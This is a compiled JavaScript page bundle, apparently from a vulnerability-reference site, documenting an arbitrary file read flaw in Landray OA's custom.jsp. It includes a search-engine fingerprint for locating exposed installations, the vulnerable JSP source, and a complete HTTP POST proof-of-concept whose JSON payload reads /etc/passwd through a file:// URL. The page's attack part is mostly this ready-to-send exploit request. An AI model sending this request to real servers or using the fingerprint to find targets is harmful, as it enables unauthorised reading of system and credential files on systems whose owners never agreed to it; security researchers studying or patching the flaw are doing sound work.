(window.webpackJsonp=window.webpackJsonp||[]).push([[561],{1735:function(a,s,t){a.exports=t.p+"assets/img/lanling-2.850c259e.png"},2998:function(a,s,t){"use strict";t.r(s);var n=t(64),e=Object(n.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"蓝凌oa-custom-jsp-任意文件读取漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#蓝凌oa-custom-jsp-任意文件读取漏洞"}},[a._v("#")]),a._v(" 蓝凌OA custom.jsp 任意文件读取漏洞")]),a._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),s("p",[a._v("深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息。")]),a._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v("蓝凌OA")]),s("br"),a._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v('app="Landray-OA系统"')]),s("br"),a._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),s("p",[a._v("出现漏洞的文件为 custom.jsp")]),a._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[a._v('<%@page import="com.landray.kmss.util.ResourceUtil"%>\n<%@page import="net.sf.json.JSONArray"%>\n<%@page import="net.sf.json.JSONObject"%>\n<%@ page language="java" pageEncoding="UTF-8"%>\n<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>\n<%\n JSONObject vara =\nJSONObject.fromObject(request.getParameter("var"));\n JSONObject body = JSONObject.fromObject(vara.get("body"));\n%>\n<c:import url=\'<%=body.getString("file") %>\'>\n <c:param name="var" value="${ param[\'var\'] }"></c:param>\n</c:import>\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br"),s("span",{staticClass:"line-number"},[a._v("9")]),s("br"),s("span",{staticClass:"line-number"},[a._v("10")]),s("br"),s("span",{staticClass:"line-number"},[a._v("11")]),s("br"),s("span",{staticClass:"line-number"},[a._v("12")]),s("br"),s("span",{staticClass:"line-number"},[a._v("13")]),s("br")])]),s("p",[a._v("请求包为")]),a._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[a._v('POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1\nHost:\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\nContent-Length: 42\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n\nvar={"body":{"file":"file:///etc/passwd"}}\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br")])]),s("p",[s("img",{attrs:{src:t(1735),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);